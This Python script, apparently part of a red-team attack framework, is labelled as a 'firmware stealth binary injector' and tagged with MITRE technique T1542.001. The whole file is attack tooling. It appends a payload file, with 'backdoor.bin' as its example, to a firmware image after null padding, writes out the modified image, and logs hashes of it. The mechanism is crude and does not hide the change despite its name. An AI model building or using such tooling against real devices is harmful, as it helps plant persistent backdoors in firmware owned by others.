# modules/attacks/firmware_stealth_rewriter.py

import os
import argparse
import json
from datetime import datetime
import hashlib
import zlib

LOG_PATH = "results/firmware_rewrite_log.json"
MITRE_TTP = "T1542.001"

def log_rewrite(entry):
    os.makedirs("results", exist_ok=True)
    if os.path.exists(LOG_PATH):
        with open(LOG_PATH, "r") as f:
            data = json.load(f)
    else:
        data = []
    data.append(entry)
    with open(LOG_PATH, "w") as f:
        json.dump(data, f, indent=2)

def rewrite_firmware(original_fw, payload_bin, output_fw):
    with open(original_fw, "rb") as f:
        firmware = f.read()

    with open(payload_bin, "rb") as f:
        payload = f.read()

    padded = firmware + b"\x00" * 256 + payload
    crc32 = zlib.crc32(padded) & 0xFFFFFFFF
    md5 = hashlib.md5(padded).hexdigest()

    with open(output_fw, "wb") as f:
        f.write(padded)

    log_rewrite({
        "timestamp": datetime.utcnow().isoformat(),
        "input": original_fw,
        "payload": payload_bin,
        "output": output_fw,
        "size": len(padded),
        "crc32": hex(crc32),
        "md5": md5,
        "ttp": MITRE_TTP
    })

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Firmware stealth binary injector")
    parser.add_argument("--firmware", required=True, help="Original firmware image")
    parser.add_argument("--payload", required=True, help="Payload to embed (e.g., backdoor.bin)")
    parser.add_argument("--out", default="results/firmware_injected.bin", help="Output firmware path")
    args = parser.parse_args()

    rewrite_firmware(args.firmware, args.payload, args.out)
    print("[+] Firmware rewritten with payload.")
